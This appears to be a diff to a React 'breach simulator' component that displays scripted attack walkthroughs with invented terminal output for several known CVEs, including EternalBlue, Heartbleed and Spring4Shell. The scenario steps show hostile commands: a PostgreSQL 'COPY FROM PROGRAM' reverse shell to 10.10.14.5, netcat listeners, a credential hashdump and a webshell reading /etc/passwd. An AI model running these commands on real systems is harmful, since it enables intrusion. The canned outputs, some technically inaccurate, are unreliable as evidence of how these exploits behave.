@@ -15,8 +15,20 @@ const BreachSimulator = ({ isOpen, onClose, targetData }) => {
   const { startRecording, stopRecording, isRecording } = useScreenRecorder();
 
   const getScenario = () => {
+    const cve = (targetData?.cve_id || targetData?.cve || '').toLowerCase();
     const name = (targetData?.name || '').toLowerCase();
     const owasp = (targetData?.owasp || targetData?.owasp_category || '').toLowerCase();
+    
+    if (cve.includes('cve-2024-6387') || name.includes('regresshion') || name.includes('ssh')) return 'REGRESSHION';
+    if (cve.includes('cve-2017-0144') || name.includes('eternalblue') || name.includes('smb')) return 'ETERNALBLUE';
+    if (cve.includes('cve-2019-0708') || name.includes('bluekeep') || name.includes('rdp')) return 'BLUEKEEP';
+    if (cve.includes('cve-2011-2523') || name.includes('vsftpd') || name.includes('ftp')) return 'VSFTPD';
+    if (cve.includes('cve-2020-10188') || name.includes('telnet')) return 'TELNET';
+    if (cve.includes('cve-2012-2122') || name.includes('mysql')) return 'MYSQL';
+    if (cve.includes('cve-2019-9193') || name.includes('postgresql')) return 'POSTGRESQL';
+    if (cve.includes('cve-2014-0160') || name.includes('heartbleed')) return 'HEARTBLEED';
+    if (cve.includes('cve-2022-22965') || name.includes('spring4shell')) return 'SPRING4SHELL';
+    if (cve.includes('cve-2021-44228') || name.includes('log4j') || name.includes('log4shell')) return 'LOG4J';
     
     if (name.includes('sql') || owasp.includes('injection')) return 'SQL_INJECTION';
     if (name.includes('xss') || name.includes('cross-site')) return 'CROSS_SITE_SCRIPTING';
@@ -26,10 +38,298 @@ const BreachSimulator = ({ isOpen, onClose, targetData }) => {
   };
 
   const scenarios = {
+    REGRESSHION: {
+        BOOT: {
+            command: "hexashield --init --vuln-db=exploit-db",
+            output: ["[  0.000000] Linux version 5.15.0-kali7", "[*] Syncing EDB-52055.py intelligence...", "[*] Target: " + (targetData?.target || '127.0.0.1')],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -sV -p 22 ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Checking SSH daemon port...", "[+] PORT 22/tcp OPEN (OpenSSH 9.2p1 Debian-2+deb12u2)", "[!] VULN CONFIRMED: CVE-2024-6387 (RegreSSHion Race Condition)"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `python3 EDB-52055.py --target ${targetData?.target || '127.0.0.1'} --port 22 --lhost 10.10.14.5`,
+            output: ["[*] Preparing glibc memory alignment payload...", "[*] Crafting SSH signal handler race condition timing loop...", "[SUCCESS] Exploit payload structure compiled."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "python3 EDB-52055.py --run-fuzzer",
+            output: ["[*] Sending public key packets to trigger memory allocation...", "[*] Initiating race condition timing loop (retrying block)..."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: "nc -lvnp 4444",
+            output: ["[*] Listening on 0.0.0.0:4444...", "[+] Connection received from " + (targetData?.target || '127.0.0.1') + "!", "[SUCCESS] Spawning root shell context (sshd child process)"],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "whoami && id",
+            output: ["root", "uid=0(root) gid=0(root) groups=0(root)", "[!] MISSION ACCOMPLISHED: OpenSSH server fully compromised (Root shell active)."],
+            next: null
+        }
+    },
+    ETERNALBLUE: {
+        BOOT: {
+            command: "msfconsole -q",
+            output: ["[*] Starting Metasploit Framework...", "[*] Loading module: exploit/windows/smb/ms17_010_eternalblue"],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -p 445 --script smb-vuln-ms17-010 ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Scanning port 445 for SMBv1 protocols...", "[+] Host supports vulnerable SMBv1 protocol.", "[!] VULN CONFIRMED: MS17-010 (EternalBlue) Remote Code Execution"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `set RHOSTS ${targetData?.target || '127.0.0.1'} && set LHOST 10.10.14.5`,
+            output: ["RHOSTS => " + (targetData?.target || '127.0.0.1'), "LHOST => 10.10.14.5", "[*] Generating ring 0 kernel shellcode payload..."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "exploit",
+            output: ["[*] Connecting to SMBv1 endpoint...", "[*] Allocating pool memory layout for kernel override...", "[*] Sending EternalBlue raw packet chain..."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: "use exploit/windows/smb/ms17_010_eternalblue",
+            output: ["[+] Pool grooming succeeded. Kernel payload deployed.", "[*] Spawning Meterpreter thread inside lsass.exe process...", "[SUCCESS] Meterpreter session 1 opened (10.10.14.5:4444 -> " + (targetData?.target || '127.0.0.1') + ":49158)"],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "getuid && sysinfo",
+            output: ["Server Username: NT AUTHORITY\\SYSTEM", "OS: Windows Server 2012 R2", "[!] MISSION ACCOMPLISHED: SYSTEM privilege established via EternalBlue."],
+            next: null
+        }
+    },
+    BLUEKEEP: {
+        BOOT: {
+            command: "msfconsole -q",
+            output: ["[*] Starting Metasploit Framework...", "[*] Loading module: exploit/windows/rdp/cve_2019_0708_bluekeep"],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -p 3389 --script rdp-vuln-ms12-020 ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Analyzing RDP channel handling...", "[+] Port 3389 RDP is open.", "[!] VULN CONFIRMED: CVE-2019-0708 (BlueKeep) Heap Corruption"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `set RHOSTS ${targetData?.target || '127.0.0.1'} && set TARGET 1`,
+            output: ["RHOST => " + (targetData?.target || '127.0.0.1'), "TARGET => Windows 7 SP1 / 2008 R2", "[*] Crafting MS_T120 channel corruption payload..."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "exploit",
+            output: ["[*] Initiating RDP protocol handshake...", "[*] Binding virtual channel: MS_T120...", "[*] Sending targeted kernel channel allocation payload..."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: "sessions -i 1",
+            output: ["[+] Grooming kernel heap space... Success.", "[*] Transferring kernel shellcode block...", "[SUCCESS] Session 1 (Meterpreter) opened to " + (targetData?.target || '127.0.0.1')],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "getuid && hashdump",
+            output: ["NT AUTHORITY\\SYSTEM", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", "[!] MISSION ACCOMPLISHED: Remote Desktop service fully compromised."],
+            next: null
+        }
+    },
+    VSFTPD: {
+        BOOT: {
+            command: "python3 EDB-49757.py --help",
+            output: ["[*] vsFTPd 2.3.4 Backdoor Trigger script.", "[*] Loading netcat helper library..."],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nc -vn ${targetData?.target || '127.0.0.1'} 21`,
+            output: ["(UNKNOWN) [" + (targetData?.target || '127.0.0.1') + "] 21 (ftp) open", "[+] Banner: 220 (vsFTPd 2.3.4)", "[!] VULN CONFIRMED: vsFTPd 2.3.4 Backdoor Signature"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `python3 EDB-49757.py --target ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Targeting: " + (targetData?.target || '127.0.0.1') + ":21", "[*] Constructing trigger packet sequence (USER anonymous:)...", "[SUCCESS] Trigger packet payload armed."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: `curl ftp://${targetData?.target || '127.0.0.1'}:21/`,
+            output: ["[*] Sending trigger username: USER anonymous:)", "[*] Sending trigger password: PASS anonymous", "[+] Backdoor signal sent successfully."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: `nc -vn ${targetData?.target || '127.0.0.1'} 6200`,
+            output: ["[*] Connecting to backdoor port 6200...", "[+] Connection established! Backdoor shell active.", "[SUCCESS] Spawning backdoor terminal..."],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "whoami && cat /etc/hostname",
+            output: ["root", "ftp-server-prod", "[!] MISSION ACCOMPLISHED: Backdoor shell connected (Root access)."],
+            next: null
+        }
+    },
+    TELNET: {
+        BOOT: {
+            command: "hexashield --payload telnet-overflow",
+            output: ["[*] Initializing Telnet Buffer Overflow payload...", "[*] Syncing CVE-2020-10188 exploit parameters..."],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -p 23 -sV ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Probing Telnet port...", "[+] PORT 23/tcp OPEN (telnetd)", "[!] VULN CONFIRMED: CVE-2020-10188 Remote Buffer Overflow"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `python3 telnet_overflow.py --target ${targetData?.target || '127.0.0.1'} --lhost 10.10.14.5`,
+            output: ["[*] Generating shellcode buffer...", "[*] Pad size: 2048 bytes. Payload size: 256 bytes.", "[SUCCESS] Overflow buffer structure generated."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "python3 telnet_overflow.py --run",
+            output: ["[*] Sending malicious option subnegotiation string...", "[*] Injecting terminal type environment variables...", "[+] Remote telnetd buffer corrupted."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: "nc -lvnp 4444",
+            output: ["listening on [any] 4444 ...", "[+] Connection from " + (targetData?.target || '127.0.0.1') + " received!", "[SUCCESS] Telnet daemon process hijacked (Reverse Shell active)."],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "whoami && uname -a",
+            output: ["root", "Linux hostname 4.19.0-openwrt", "[!] MISSION ACCOMPLISHED: Reverse shell spawned under Root permissions."],
+            next: null
+        }
+    },
+    MYSQL: {
+        BOOT: {
+            command: "mysql --version",
+            output: ["mysql  Ver 15.1 Distrib 10.5.12-MariaDB", "[*] Syncing CVE-2012-2122 flood-bypass tool..."],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -p 3306 -sV ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Scanning database port...", "[+] PORT 3306/tcp OPEN (MySQL 5.5.23)", "[!] VULN CONFIRMED: CVE-2012-2122 Password Bypass Vulnerability"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `python3 mysql_bypass.py --target ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Initializing auth flood sequence...", "[*] Targeting user 'root' on MySQL server...", "[SUCCESS] Flood process armed."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "python3 mysql_bypass.py --run",
+            output: ["[*] Starting auth loop (attempting wrong password flood)...", "[*] Sent 100 authentication packets...", "[*] Sent 200 authentication packets..."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: `mysql -u root -h ${targetData?.target || '127.0.0.1'} -pwrong_password`,
+            output: ["[+] Authenticated bypassed on attempt 241!", "[SUCCESS] Logged in successfully (root@localhost)", "Welcome to the MySQL monitor."],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "show databases; select user();",
+            output: ["+--------------------+", "| Database           |", "+--------------------+", "| information_schema |", "| mysql              |", "| production_db      |", "+--------------------+", "root@localhost", "[!] MISSION ACCOMPLISHED: Full Database Administrator privilege bypass."],
+            next: null
+        }
+    },
+    POSTGRESQL: {
+        BOOT: {
+            command: "psql --version",
+            output: ["psql (PostgreSQL) 11.5", "[*] Initializing Program COPY Execution vectors..."],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -p 5432 -sV ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Scanning database port...", "[+] PORT 5432/tcp OPEN (PostgreSQL 11.2)", "[!] VULN CONFIRMED: CVE-2019-9193 Command Execution via COPY"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `psql -h ${targetData?.target || '127.0.0.1'} -U postgres`,
+            output: ["[*] Connecting with default postgres superuser...", "[SUCCESS] PostgreSQL shell active. Preparing payload commands..."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);",
+            output: ["DROP TABLE", "CREATE TABLE", "[+] Command execution table ready in public schema."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: "COPY cmd_exec FROM PROGRAM 'nc -e /bin/sh 10.10.14.5 4444';",
+            output: ["[*] Triggering FROM PROGRAM shell command...", "[*] Sending database instruction...", "[SUCCESS] Command execution completed."],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "nc -lvnp 4444",
+            output: ["listening on [any] 4444 ...", "[+] connection from " + (targetData?.target || '127.0.0.1') + " received!", "postgres", "uid=109(postgres) gid=115(postgres) groups=115(postgres)", "[!] MISSION ACCOMPLISHED: OS Command Execution achieved via PostgreSQL database."],
+            next: null
+        }
+    },
+    HEARTBLEED: {
+        BOOT: {
+            command: "sslyze --version",
+            output: ["SSLyze version 5.0.0", "[*] Syncing ssl_heartbleed.py script..."],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `nmap -p 443 --script ssl-heartbleed ${targetData?.target || '127.0.0.1'}`,
+            output: ["[*] Connecting to HTTPS port...", "[+] PORT 443/tcp OPEN (OpenSSL 1.0.1f)", "[!] VULN CONFIRMED: CVE-2014-0160 (Heartbleed) SSL Extension Leak"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `python3 ssl_heartbleed.py ${targetData?.target || '127.0.0.1'} -p 443 --lhost 10.10.14.5`,
+            output: ["[*] Constructing TLS Heartbeat ClientHello packet...", "[*] Setting heartbeat payload request size to 65535...", "[SUCCESS] Heartbleed leak packet structured."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "python3 ssl_heartbleed.py --leak",
+            output: ["[*] Sending TLS ClientHello with Heartbeat extension...", "[*] Receiving SSL heartbleed response packet...", "[+] Memory leak returned successfully! Checking buffer..."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: "python3 ssl_heartbleed.py --dump",
+            output: ["----------------- LEAKED SSL MEMORY DUMP --------------------", "0000: 02 40 00 d8 03 02 53 43 52 45 54 5f 4b 45 59 3d  .@....SECRET_KEY=", "0010: 61 64 6d 69 6e 5f 70 61 73 73 3d 73 75 70 65 72  admin_pass=super", "0020: 73 65 63 75 72 65 31 32 33 0d 0a 43 6f 6f 6b 69  secure123..Cooki", "-------------------------------------------------------------", "[SUCCESS] Extracted sensitive plain-text parameters from TLS memory."],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: "grep -oE \"admin_pass=\\w+\" memory_dump.bin",
+            output: ["admin_pass=supersecure123", "[!] MISSION ACCOMPLISHED: Session passwords leaked from live OpenSSL daemon memory."],
+            next: null
+        }
+    },
+    SPRING4SHELL: {
+        BOOT: {
+            command: "hexashield --payload spring4shell",
+            output: ["[*] Syncing spring4shell_exploit.py intelligence...", "[*] Setting endpoint context mapping..."],
+            next: 'RECON'
+        },
+        RECON: {
+            command: `curl -I http://${targetData?.target || '127.0.0.1'}:8080/`,
+            output: ["[*] Checking HTTP server header...", "[+] Server: Apache Tomcat/9.0.58", "[!] VULN CONFIRMED: CVE-2022-22965 (Spring4Shell) RCE via Class Loader Routing"],
+            next: 'WEAPON'
+        },
+        WEAPON: {
+            command: `python3 spring4shell_exploit.py --url http://${targetData?.target || '127.0.0.1'}:8080/ --lhost 10.10.14.5`,
+            output: ["[*] Preparing class loader override instruction...", "[*] Mapping tomcat pipeline configurations...", "[SUCCESS] JSP back-door trigger payload prepared."],
+            next: 'DELIVERY'
+        },
+        DELIVERY: {
+            command: "python3 spring4shell_exploit.py --run",
+            output: ["[*] Executing payload class rewrite query parameters...", "[*] Writing JSP webshell payload: webapp/tomcat.jsp...", "[SUCCESS] Tomcat log writing successfully hijacked."],
+            next: 'EXPLOIT'
+        },
+        EXPLOIT: {
+            command: `curl http://${targetData?.target || '127.0.0.1'}:8080/tomcat.jsp?cmd=whoami`,
+            output: ["[*] Querying deployed backdoor shell...", "[+] Response: tomcat", "[SUCCESS] Remote Command Execution verified on target server."],
+            next: 'IMPACT'
+        },
+        IMPACT: {
+            command: `curl http://${targetData?.target || '127.0.0.1'}:8080/tomcat.jsp?cmd=cat%20/etc/passwd`,
+            output: ["tomcat:x:1001:1001::/home/tomcat:/bin/sh", "[!] MISSION ACCOMPLISHED: RCE achieved in Spring container namespace (tomcat user level)."],
+            next: null
+        }
+    },
     LOG4J: {
         BOOT: {
             command: "hexashield --init --vuln-db=exploit-db",
-            output: ["[  0.000000] Linux version 5.15.0-kali7", "[*] Syncing EDB-50592.py intelligence...", "[*] Target: " + (targetData?.target || 'GLOBAL')],
+            output: ["[  0.000000] Linux version 5.15.0-kali7", "[*] Syncing EDB-50592.py intelligence...", "[*] Target: " + (targetData?.target || '127.0.0.1')],
             next: 'RECON'
         },
         RECON: {
@@ -49,7 +349,7 @@ const BreachSimulator = ({ isOpen, onClose, targetData }) => {
         },
         EXPLOIT: {
             command: "nc -lvnp 4444 (Listening Link: http://10.10.14.5:4444/rev_shell)",
-            output: ["listening on [any] 4444 ...", "[+] Connection from " + (targetData?.target || 'target') + " received!", "[SUCCESS] Shell spawned (uid=0)"],
+            output: ["listening on [any] 4444 ...", "[+] Connection from " + (targetData?.target || '127.0.0.1') + " received!", "[SUCCESS] Shell spawned (uid=0)"],
             next: 'IMPACT'
         },
         IMPACT: {
